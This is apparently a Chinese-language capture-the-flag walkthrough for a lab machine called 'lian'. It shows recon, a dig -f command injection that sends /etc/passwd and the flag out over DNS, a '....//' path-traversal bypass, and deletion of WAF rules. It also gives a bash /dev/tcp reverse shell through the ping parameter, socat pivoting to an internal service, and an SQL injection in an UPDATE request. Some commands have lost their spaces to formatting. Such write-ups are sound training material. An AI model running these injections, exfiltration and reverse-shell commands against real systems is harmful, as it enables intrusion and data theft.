---
title: MazeSec-lian
url: https://mp.weixin.qq.com/s/Q9DnQIVuYgqXyo8I7QTGdw
source: Doonsec's feed
date: 2026-09-30
fetch_date: 2026-10-01T07:56:53.810940
---

# MazeSec-lian

# MazeSec-lian

原创

識.
識.

0xNyx

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## Flag 1:`userFLAG`(DNS 外带,不需要 shell)

原理:`dig -f <文件>` 会把文件每一行当成一个 DNS 查询名发出去。靶机往你的 IP 发查询,你抓包就能拿到文件内容。

![](https://mmbiz.qpic.cn/mmbiz_png/icPMQgcMTD2fW7Zj7xGYScNpHkZ2M02R5kDWq6546db9r7rY2XP43nGYywKLXp43U2cPUVhia4bgHIJrwhKvQ0Copf70HmUbfG4Wiaic9ksTAyI/640?wx_fmt=png&from=appmsg)

nmap扫描发现暴露80，22端口

访问80端口

![](https://mmbiz.qpic.cn/mmbiz_png/icPMQgcMTD2eDvKDKzvVz2CClVc3Qj2a7hnW0TMiaBYBg9bskh4V9zDRhpugWUSvvvwLj50orVDWSpE0adBPicu49hZhrhT8jyRt642LBgbZrU/640?wx_fmt=png&from=appmsg)

查看状态码301，有访问条件，细看响应发现需要host

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icPMQgcMTD2crha1JGmpeHQDAWm5FjGO8YJbmUHyCITGe4Qqn9HeSlIb8KkFia1zicSnsicia2L9szjEa4M8smDHpnYdjicwPuXJnXb3aV5HurHbI/640?wx_fmt=png&from=appmsg)

依旧dirsearch起手

![](https://mmbiz.qpic.cn/mmbiz_png/icPMQgcMTD2eal1G9HepwuV5YBjxNBwOEabezAvKSL1e1xlJOKNAS1FEnoyDlwosxrtYUDSNjLsv4UAsEEWqeuiagZnpQ16K8suuquRtV8aiao/640?wx_fmt=png&from=appmsg)

本来打算通过浏览器访问后下载log，折腾半天没成功，希望有大佬教我

ai小子只能用curl手敲命令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icPMQgcMTD2fNQosNyRRXjuNib2PFAxXtFsXAPMvoUmpxAAUUZr4R1YMz4r1u6vWCCNMVCZE4iczSQqvarC9N6JysBWYEN4CrniasVApN5wNich0/640?wx_fmt=png&from=appmsg)

这还说啥了

cat一手

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icPMQgcMTD2exRHia8gwuMN1icFhCNXFNPmfeLq92sFCFJlUtEQ5IB0ScnqL1dAfwvpib0sXVgtovGDiaW0rRyrCQ2wmOm9DJc67Ia5uMR2ps3HE/640?wx_fmt=png&from=appmsg)

这还说啥了

grep一手

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icPMQgcMTD2ecKD0AGnSpvKNibcdczbfmUCE2ZpaiaMYibH2icR6rEhibkyQfQzhTxUxzcJK7ICekNkYldNZshgGHh5BUXQ8J8ObjSkAkLuVHAlQs/640?wx_fmt=png&from=appmsg)

这还说啥了

**参数格式白送给你了。** 日志里作者自己的调用记录

**先确认要不要登录**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icPMQgcMTD2f98dic2MNgNiaTXhDqCicEoSbGjohZJfT9qUtjrQnBpsr0sbvkhmNnCgp2MibUMRuqdKavqicfazMaXPGphKCGGI1o0DtFS96ziaZmI/640?wx_fmt=png&from=appmsg)

进行信息整理

```
未授权可达:  /  /logs/access.log  /logs/error.log  /conf/  /style.css  /.htaccessOLD(疑似)
需登录:      /index.php  /dashboard.php  /logs.php  /status.php  /net.php
异常点:      /auth.php  200 但 0 字节
```

下一步

![](https://mmbiz.qpic.cn/sz_mmbiz_png/icPMQgcMTD2c6f3IP1bSQL0sWrnRNN1rlNGiahibsrbI55JbMBR8JYbdMCWHuMfLa44aTB3hMr8X2Hibp0O3CaCtTSLib4KO52lxuaREkqfLL2p8/640?wx_fmt=png&from=appmsg)

# 先用个小文件验证通路

curl -s -b cookies.txt "http://lian.dsz/net.php?tool=dig&target=-f+/etc/hostname+@$MYIP" -o /dev/null

sleep 2; cat exfil.txt

 有内容 → 通路 OK。然后按顺序来:

# 3. 读 /etc/passwd,找普通用户

curl -s -b cookies.txt "http://lian.dsz/net.php?tool=dig&target=-f+/etc/passwd+@$MYIP" -o /dev/null

sleep 5; grep -v '^$' exfil.txt

# 4. 按 WP,用户是 yulian007,直接读 flag

curl -s -b cookies.txt "http://lian.dsz/net.php?tool=dig&target=-f+/home/yulian007/userFLAG+@$MYIP" -o /dev/null

sleep 5; cat exfil.txt

**卡住的话:**

* 用 `hostname -I` 看是不是有多个网卡,换那个跟靶机同网段的试试;或者直接在靶机 VM 里跑接收端
* dig 等很久 → `target` 里加 `+time=1+tries=1`:`-f /etc/passwd +time=1 +tries=1 @$MYIP`
* 报被拦 → 先往下走,第 2 步删了 WAF 再回来

## Flag 2:Root(要 RCE → 内网 → 提权)

#### 2.1 路径穿越,先读源码确认

curl -s -b cookies.txt "http://lian.dsz/logs.php?name=....//index.php" | head -40

`str_replace('../','')`**只替换一轮**,`....//` 去掉中间那层后剩下的正好又是 `../` —— 确认能读到就继续。

#### 2.2 删掉 WAF 规则

# 先备份看一眼

curl -s -b cookies.txt "http://lian.dsz/logs.php?name=....//conf/waf.rules" -o waf.bak

curl -s -b cookies.txt "http://lian.dsz/logs.php?name=....//conf/waf.rules"

curl -s -b cookies.txt "http://lian.dsz/logs.php?name=....//conf/waf.rules" | head -5

#### 2.3 RCE + 反弹 shell

**Kali 这边先开监听:**

**nc -lvnp 4444**

**另一个终端触发:**

**MYIP=$(hostname -I | awk '{print $1}')**

**curl-s-bcookies.txt"****http://lian.dsz/net.php?tool=ping&target=;bash+-c+'bash+-i+>&+/dev/tcp/$MYIP/4444+0>&1'"**

#### **2.4 穿透内网 8080(在靶机上跑,不是 Kali)**

cd /opt/perma-app

./socat TCP-LISTEN:9999,fork,reuseaddr TCP:127.0.0.1:8080

 socat 报错就 `which socat` 看有没有;没有就 `apt install socat`。

 Kali 这边验证:

curl -s http://10.17.113.91:9999/ | head -40

#### 2.5 找到 root 凭据

**先扫出哪些用户真实存在:**

**for i in $(seq 1 10000); do**

**r=$(curl -s "****http://10.17.113.91:9999/user/$i/edit")**

**echo "$r" | grep -q 'name=' && echo "$i: $(echo "$r" | grep -oE 'value="[^"]\*"' | tr '\n' ' ')"**

**done | grep -v 'value=""'**

**直接：**

**curl -s****http://10.17.113.91:9999/user/6666/edit**

**UPDATE 注入(注意那个**`, email=`**的闭合手法):**

**curl -s -X POST "****http://10.17.113.91:9999/user/6666/update"****\**

**-d "name=PWNED\_BY\_SQLI', email='p@x" -d "email=x@x.x"**

**执行顺序提醒: Flag 1 不用删 WAF,先把它拿下;Flag 2 才需要 2.2 那步。别一上来就**`sed -i`**删规则,先**`curl`**存一份,不然删完你都不知道刚才被什么挡着。**

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/icPMQgcMTD2ceTCkDez0Piat8aPQyHu06KEJDNNd4u19ZCweicJEoK4tnFV6nQBcXzmV90K7UTllfDM75weNK6tmntI3BhMrkMiaU9bg5ZiaL1EM/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过